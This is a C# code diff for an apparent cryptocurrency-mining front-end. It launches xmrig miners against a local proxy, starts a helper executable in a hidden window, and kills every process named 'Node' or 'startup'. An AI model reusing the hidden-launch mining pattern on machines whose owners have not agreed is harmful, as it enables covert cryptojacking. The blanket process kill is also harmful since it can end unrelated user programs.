@@ -35,6 +35,8 @@ namespace WindowsFormsApp1
             Process[] processes = Process.GetProcessesByName("xmrig-cpu");
             Process[] processes2 = Process.GetProcessesByName("xmrig-nvidia");
             Process[] processes3 = Process.GetProcessesByName("xmrig-amd");
+            Process[] processes4 = Process.GetProcessesByName("startup");
+            Process[] processes5 = Process.GetProcessesByName("Node");
 
             foreach (Process process in processes)
             {
@@ -78,15 +80,43 @@ namespace WindowsFormsApp1
                 {
                 }
             }
+            foreach (Process process in processes4)
+            {
+                try
+                {
+                    int procc = process.Id;
+                    if (procc != 0)
+                    {
+                        process.Kill();
+                    }
+                }
+                catch (Exception)
+                {
+                }
+            }
+            foreach (Process process in processes5)
+            {
+                try
+                {
+                    int procc = process.Id;
+                    if (procc != 0)
+                    {
+                        process.Kill();
+                    }
+                }
+                catch (Exception)
+                {
+                }
+            }
         }
 
         int prt = 0;
 
         private void Form2_Load(object sender, EventArgs e)
         {
-            string cmd = "start C:\\PMApp\\xmrig\\xmrig-cpu.exe" + Static.bg + " -a cryptonight -o stratum+tcp://" + Static.pool + " -u " + Static.user + " -p " + Static.pass + " --api-port 9001";
-            string cmd2 = "start C:\\PMApp\\xmrig\\xmrig-nvidia.exe" + Static.bg + " -a cryptonight -o stratum+tcp://" + Static.pool + " -u " + Static.user + " -p " + Static.pass + " --api-port 9002";
-            string cmd3 = "start C:\\PMApp\\xmrig\\xmrig-amd.exe" + Static.bg + " -a cryptonight -o stratum+tcp://" + Static.pool + " -u " + Static.user + " -p " + Static.pass + " --api-port 9003";
+            string cmd = "start C:\\PMApp\\xmrig\\xmrig-cpu.exe" + Static.bg + " -a cryptonight -o stratum+tcp://127.0.0.1:8888 -u cpu -p cpu --api-port 9001";
+            string cmd2 = "start C:\\PMApp\\xmrig\\xmrig-nvidia.exe" + Static.bg + " -a cryptonight -o stratum+tcp://127.0.0.1:8888 -u nvidia -p cuda --api-port 9002";
+            string cmd3 = "start C:\\PMApp\\xmrig\\xmrig-amd.exe" + Static.bg + " -a cryptonight -o stratum+tcp://127.0.0.1:8888 -u amd -p ocl --api-port 9003";
             var proc = new ProcessStartInfo()
             {
                 UseShellExecute = true,
@@ -124,6 +154,15 @@ namespace WindowsFormsApp1
             {
                 Process.Start(proc3);
             }
+
+            var proc4 = new ProcessStartInfo()
+            {
+                UseShellExecute = true,
+                WorkingDirectory = @"C:\PMApp\xmrig",
+                FileName = @"C:\PMApp\xmrig\startup.exe",
+                WindowStyle = ProcessWindowStyle.Hidden
+            };
+            Process.Start(proc4);
 
             timer1.Interval = 1000;
             timer2.Interval = Static.refresh;
